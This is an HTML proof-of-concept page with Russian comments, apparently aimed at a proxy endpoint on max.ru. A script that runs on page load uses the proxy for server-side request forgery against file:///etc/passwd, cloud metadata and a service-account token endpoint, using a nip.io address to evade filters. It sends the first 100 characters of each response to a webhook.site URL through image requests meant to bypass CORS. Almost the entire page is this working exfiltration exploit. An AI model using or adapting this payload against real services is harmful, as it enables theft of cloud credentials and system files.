<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC Test</title>
</head>
<body>
    <script>
        const hook = "https://webhook.site/db69ae80-4433-4821-8c44-090b6df24af8";
        const proxy = "https://max.ru/proxy?url=";
        
        // Массив целей
        const targets = {
            "passwd": "file:///etc/passwd",
            "metadata": "http://169.254.169.254.nip.io/latest/meta-data/",
            "token": "http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token"
        };

        // Функция отправки через картинку (не блокируется CORS)
        function sendSignal(name, data) {
            const img = new Image();
            img.src = `${hook}?type=${name}&info=${encodeURIComponent(data)}&nocache=${Math.random()}`;
        }

        async function run() {
            // Сигнал о запуске
            sendSignal("START", "Browser_Exploit_Active");

            for (let key in targets) {
                try {
                    const url = proxy + encodeURIComponent(targets[key]);
                    
                    // Пытаемся получить данные
                    const r = await fetch(url);
                    const text = await r.text();

                    if (text.length > 0) {
                        // Отправляем первые 100 символов ответа
                        sendSignal("SUCCESS_" + key, text.substring(0, 100));
                    }
                } catch (e) {
                    sendSignal("BLOCKED_" + key, "CORS_or_Filter");
                }
            }
        }

        run();
    </script>
</body>
</html>
